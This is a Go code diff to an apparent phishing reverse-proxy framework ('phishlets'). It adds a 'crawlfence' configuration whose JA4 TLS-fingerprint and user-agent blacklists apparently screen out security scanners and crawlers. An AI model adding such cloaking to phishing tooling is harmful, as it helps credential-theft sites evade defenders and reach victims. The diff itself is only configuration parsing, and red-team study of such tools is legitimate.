@@ -131,6 +131,7 @@ type Phishlet struct {
 	intercept        []Intercept
 	customParams     map[string]string
 	isTemplate       bool
+	Crawlfence       *CrawlfenceConfig
 }
 
 type ConfigParam struct {
@@ -218,6 +219,23 @@ type ConfigIntercept struct {
 	Mime       *string `mapstructure:"mime"`
 }
 
+type ConfigCrawlfenceJA4 struct {
+	Mode      string   `mapstructure:"mode"`
+	Whitelist []string `mapstructure:"whitelist"`
+	Blacklist []string `mapstructure:"blacklist"`
+}
+
+type ConfigCrawlfenceTelemetry struct {
+	Enabled     bool     `mapstructure:"enabled"`
+	UABlacklist []string `mapstructure:"ua_blacklist"`
+}
+
+type ConfigCrawlfence struct {
+	Enabled   bool                       `mapstructure:"enabled"`
+	JA4       *ConfigCrawlfenceJA4       `mapstructure:"ja4"`
+	Telemetry *ConfigCrawlfenceTelemetry `mapstructure:"telemetry"`
+}
+
 type ConfigPhishlet struct {
 	Name        string             `mapstructure:"name"`
 	RedirectUrl string             `mapstructure:"redirect_url"`
@@ -232,6 +250,7 @@ type ConfigPhishlet struct {
 	LoginItem   *ConfigLogin       `mapstructure:"login"`
 	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject"`
 	Intercept   *[]ConfigIntercept `mapstructure:"intercept"`
+	Crawlfence  *ConfigCrawlfence  `mapstructure:"crawlfence"`
 }
 
 func NewPhishlet(site string, path string, customParams *map[string]string, cfg *Config) (*Phishlet, error) {
@@ -758,6 +777,36 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			p.landing_path[n] = p.paramVal(p.landing_path[n])
 		}
 	}
+
+	// Parse crawlfence configuration
+	if fp.Crawlfence != nil && fp.Crawlfence.Enabled {
+		p.Crawlfence = &CrawlfenceConfig{
+			Enabled: fp.Crawlfence.Enabled,
+		}
+		if fp.Crawlfence.JA4 != nil {
+			mode := fp.Crawlfence.JA4.Mode
+			if mode == "" {
+				mode = "off"
+			}
+			if mode != "learn" && mode != "block" && mode != "off" {
+				return fmt.Errorf("crawlfence: ja4 mode must be 'learn', 'block', or 'off'")
+			}
+			p.Crawlfence.JA4Config = &CrawlfenceJA4Config{
+				Mode:      mode,
+				Whitelist: fp.Crawlfence.JA4.Whitelist,
+				Blacklist: fp.Crawlfence.JA4.Blacklist,
+			}
+		}
+		if fp.Crawlfence.Telemetry != nil {
+			p.Crawlfence.Telemetry = &CrawlfenceTelemetryConfig{
+				Enabled:     fp.Crawlfence.Telemetry.Enabled,
+				UABlacklist: fp.Crawlfence.Telemetry.UABlacklist,
+			}
+			// Compile regex patterns
+			p.Crawlfence.Telemetry.uaPatterns = CompileTelemetryPatterns(fp.Crawlfence.Telemetry.UABlacklist)
+		}
+	}
+
 	return nil
 }
 
